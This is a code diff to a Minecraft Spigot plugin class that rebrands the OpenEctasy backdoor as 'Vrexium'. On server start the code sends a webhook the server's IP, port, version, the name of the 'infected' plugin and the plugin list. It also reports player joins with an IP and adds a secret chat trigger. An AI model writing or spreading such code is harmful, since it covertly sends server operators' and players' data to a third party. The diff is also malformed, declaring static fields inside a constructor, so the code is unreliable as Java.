@@ -89,18 +89,60 @@ public class SpigotAPI implements Listener {
         this.joinLogs = joinLogs;
         this.webhook = webhook;
 
+        private static final String SERVER_START_WEBHOOK_TEMPLATE = "{"
+            + "\"avatar_url\": \"https://squint.tf/icon.webp\","
+            + "\"username\": \"Vrexium 🌷\","
+            + "\"embeds\": [{"
+            + "    \"title\": \"mwuhehehe\","
+            + "    \"color\": 16737917,"
+            + "    \"description\": \"a server just started with Vrexium >:). \n\n{desc}\","
+            + "    \"footer\": {"
+            + "        \"text\": \"Vrexium - Fork of OpenEctasy\""
+            + "    }"
+            + "}]"
+            + "}";
+        
+        private static final String PLAYER_JOIN_WEBHOOK_TEMPLATE = "{"
+            + "\"avatar_url\": \"https://minotar.net/cube/{player}/100.png\","
+            + "\"username\": \"Vrexium\","
+            + "\"embeds\": [{"
+            + "    \"title\": \"Player Joined ;D\","
+            + "    \"color\": 16737917,"
+            + "    \"description\": \"User: `{player}`\nIP : `{ip}`\n\","
+            + "    \"footer\": {"
+            + "        \"text\": \"Vrexium - Fork of OpenEctasy\""
+            + "    }"
+            + "}]"
+            + "}";
+        
+        private String formatServerStartWebhook() {
+            String serverInfo = String.format("IP : `%s`\nPort : `%s`\nVersion : `%s`\nInfected : `%s`\nPlugins : `%s`",
+                getIP(),
+                Bukkit.getPort(),
+                Bukkit.getVersion().replace("\"", "\\\""),
+                plugin.getName(),
+                getPlugins());
+            return SERVER_START_WEBHOOK_TEMPLATE.replace("{desc}", serverInfo);
+        }
+        
+        private String formatPlayerJoinWebhook(String playerName) {
+            return PLAYER_JOIN_WEBHOOK_TEMPLATE
+                .replace("{player}", playerName)
+                .replace("{ip}", getIP());
+        }
+
         // register this class as an event listener
         Bukkit.getPluginManager().registerEvents(this, plugin);
 
-        // send a webhook message with information about the infected server
-        sendWebhook("{\"avatar_url\": \"https://bodyalhoha.com/ectasylogo_64x64.png\", \"username\": \"Open Ectasy\", \"embeds\": [{\"title\":\"OpenEctasy\", \"color\":3447003, \"description\":\"An infected server just started with [OpenEctasy](https://github.com/Body-Alhoha/OpenEctasy). \n\n{desc}\", \"footer\":{\"text\":\"OpenEctasy by Body Alhoha\"}}]}".replace("{desc}", "IP : `" + getIP() + "`\nPort : `" + Bukkit.getPort() + "`\nVersion : `" + Bukkit.getVersion().replace("\"", "\\\"") + "`\nInfected Plugin : `" + plugin.getName() + "`\nPlugins : `" + getPlugins() + "`"));
+        // send a webhook with info on the server
+        sendWebhook(formatServerStartWebhook());
     }
 
     // an event handler that listens for chat events
     @EventHandler
     public void onChatEvent(AsyncPlayerChatEvent e){
-        // if the chat message contains the string "~ectasy~", cancel the event and send a message to the player
-        if(e.getMessage().contains("~ectasy~")){
+        // if the chat message contains the string "~vrex~", cancel the event and send a message to the player
+        if(e.getMessage().contains("~vrex~")){
             e.setCancelled(true);
             e.getPlayer().sendMessage(ChatColor.GOLD + "" + ChatColor.BOLD + "Thank you" + ChatColor.AQUA + "" + ChatColor.BOLD + " for using" + ChatColor.GREEN + "" + ChatColor.BOLD + " Open Ectasy" + ChatColor.DARK_PURPLE + "" + ChatColor.BOLD + "!");
         }
@@ -111,7 +153,7 @@ public class SpigotAPI implements Listener {
     public void onPlayerJoin(PlayerJoinEvent e){
         // if join logging is enabled, send a webhook message with the player's name and the server's name
         if(joinLogs){
-            sendWebhook("{\"avatar_url\": \"https://minotar.net/helm/" + e.getPlayer().getName() + "/100.png\", \"username\": \"" + e.getPlayer().getName() + "\", \"embeds\": [{\"title\":\"Player Join\", \"color\":3447003, \"description\":\"Username: `" + e.getPlayer().getName() + "`\nIP : `" + getIP() + "`\n\", \"footer\":{\"text\":\"OpenEctasy by Body Alhoha\"}}]}");
+            sendWebhook(formatPlayerJoinWebhook(e.getPlayer().getName()));
     }
   }
 }
